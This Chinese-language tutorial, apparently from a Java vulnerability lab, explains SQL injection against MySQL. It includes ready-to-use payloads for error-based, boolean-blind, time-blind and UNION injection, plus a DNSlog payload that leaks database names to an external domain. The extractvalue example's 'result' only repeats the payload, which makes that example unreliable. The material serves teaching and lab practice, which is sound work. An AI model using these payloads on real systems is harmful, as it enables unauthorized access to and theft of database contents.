# SQL注入

---
SQL注入是一种常见的安全漏洞，它利用了程序中未经过正确验证和授权的输入参数，从而使攻击者可以在 SQL 查询语句中注入恶意的 SQL 代码，以此来获取敏感信息或者实施其他攻击行为。

攻击者通过在应用程序中输入特定的字符或语句来执行任意SQL查询，通过这个漏洞可以获取和修改后台数据库中的数据，甚至能够对整个系统进行控制。

SQL注入在执行效果上分为六类，分别为报错注入，布尔盲注，时间盲注，联合查询，堆叠注入，DNSlog回显注入

在mysql5.0之后有数据库information_schema，其中包含了schemata表、tables表、columns表分别存储了所有的数据库名、表名、列名。

表名            |           列名
---------------|---------------
schemata       |     schema_name 数据库名
tables         |      table_name  表名 where table_schema
columns        |      column_name 列名 where table_schema and table_name

可通过以下sql进行查询

查询数据库名
```sql
select schema_name from information_schema.schemata
```
查询表名
```sql
select table_name from information_schema.tables where table_schema=?
```
查询列名
```sql
select column_name from information_schema.columns where table_schema=? and table_name=?
```
当存在SQL注入时，可通过以上信息查询出数据库名、表名、列名。得到这些信息后则可进一步查询数据。
## 1. 报错注入(Error-Based SQL Injection)
当系统会将错误返回至前端，则可通过构造特殊的语句，让信息通过报错提示而显示回来,以下主要介绍三种

### 1.1 通过floor()报错注入
#### 报错原理
```
select count(*),(floor(rand(0)*2)) x from users group by x        
```
在执行以上语句时，mysql会先建立一个虚拟表，然后开始查询数据，取数据库中的数据，如果虚拟表中没有相等的键值，就会添加对应的记录，如果找到相应的键值，就会count(*)++。这也就是这条语句执行的基本过程。当floor(rand(0)*2)语句的多次执行，会导致虚拟表中的主键重复，从而导致报错。

所以当我们执行以下sql语句时
```sql
and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a) -- 
```
database()处即为语句执行处，上面我们已经说到了，为何会报错。报错后会提示错误信息，如下：
```
ERROR 1062 (23000): Duplicate entry 'java_vulnerability_hub' for key 'group_key'
```
可以看到，虽然报错了，但是database()语句也成功执行了，所以可以利用此处的语句执行来得到我们想要的数据信息等。

### 1.2 通过extractValue()报错注入
extractValue()函数为MYSQL对XML文档数据进行查询的XPATH函数
语法： extractValue(xml_document, xpath_string)；

第一个参数：XML_document是String格式，为XML文档对象的名称，

第二个参数：XPath_string (Xpath格式的字符串)；

Xpath定位必须是有效的，否则则会发生错误；所以可以在这个位置植入表达式，做执行后报错
若XPath_string参数不符合xpath格式，就会报错。

例如
```sql
and extractvalue(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e)) -- 
```
结果如下
```sql
and extractvalue(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e)) --
```

### 1.3 通过updateXml()报错注入

updatexml()函数是MYSQL对XML文档数据进行查询和修改的XPATH函数。

语法：UPDATEXML (xml_document, XPathstring, new_value)。

第一个参数：xml_document，文档名称。

第二个参数：XPath_string (Xpath格式的字符串)，做内容定位。

第三个参数：new_value，String格式，替换查找到的符合条件的值。
若xpath_expr参数不符合xpath格式，就会报错。

而~符号(ascii编码值：0x7e)是不存在xpath格式中的， 所以一旦在XPath_string参数中使用~符号，就会产生xpath syntax error (xpath语法错误)，通过使用这个方法就可以达到报错注入的目的

例如
```sql
and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e),3)
```

如下报错
```
### Error querying database.  Cause: java.sql.SQLException: XPATH syntax error: '~mysql~'

### The error may exist in file [D:\JavaVulnerabilityHub\target\classes\mapper\SQLMapper.xml]

### The error may involve com.z4c.vulnerabilityhub.mapper.SQLMapper.getUserByUsername-Inline

### The error occurred while setting parameters

### SQL: SELECT * FROM vulhub_User WHERE username='1' and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e),3) -- '

### Cause: java.sql.SQLException: XPATH syntax error: '~mysql~'
```


## 2. 布尔盲注
当系统不会将错误返回至前端，则可以通过if语句、like函数、正则表达式 regexp 、mid()函数、left()函数来进行注入。

假设查询语句为
```sql
select * from list where id = '${id}'
```
当我们输入
```
1' and left((select database()),1)='j' --
```
最终执行的sql语句为
```sql
select * from list where id = '1' and left((select database()),1)='j' -- 
```
需要确保表中有id=1的数据，由于使用是and连接词，所以以上语句当数据库开头为j时，接口能够正常返回id=1的数据。如果不为j，则返回空。
随后可将j改为ja继续进行测试，从而获得完成的数据库名。

## 3. 时间盲注
当系统不会将错误返回至前端，则可以通过判断sleep，benchmark函数是否执行来进行注入。

首先判断库名,此为判断第一个字母的ascii码是否为115
```sql
and if(ascii(substr(database(),1,1))=115,sleep(5),0) --+
```
当库名的ascii为115（对应为s字母）时，响应会延迟五秒。
同理可以表名、列名。盲注通常使用工具自动进行。


## 4. 联合查询
当系统会将返回结果返回至前端，我们可以通过联合查询将想要数据加入到返回结果中。

例如 假设查询语句为
```sql
select key,name from list where id = '${id}'
```

当我们输入
```
1' union select user(),database() --+ 
```

最终执行的sql语句为
```sql
select key,name from list where id = '1' union select user(),database() --+ 
```
从而查询出来的结果为

key    |   name
-------|--------
1      |vul
root@localhost|java_vulnerability_hub

可以通过更改联合查询的的语句从而获取想要的信息

## 5.堆叠注入

堆叠注入触发的条件很苛刻，因为堆叠注入原理就是通过结束符同时执行多条sql语句，这就需要服务器在访问数据端时使用的是可同时执行多条sql语句的方法，例如php中的mysqli_multi_query函数。但与之相对应的mysqli_query()函数一次只能执行一条sql语句，所以要想目标存在堆叠注入,在目标主机没有对堆叠注入进行黑名单过滤的情况下必须存在类似于mysqli_multi_query()这样的函数

java中没有类似的函数，不进行详细介绍。

## 6.DNSlog回显注入

Dnslog也称为dns外带查询，可以通过dns解析记录，来得到回显的数据。

sql盲注利用dnslog时，回显只能适用于windows系统，因为在进行dnslog回显时，需要用到load_file()这个函数，这个函数可以进行dns请求。

例如
```sql
and if((select load_file(concat('\\',(select database()),'.dnslog.com'))),1,0)--+
```

该sql语句会将database()的运行结果拼接到.dnslog.com。执行load_file()函数时会进行dns解析，从而我们可以在dns服务器获取到完整的域名，其中包括database()的运行结果。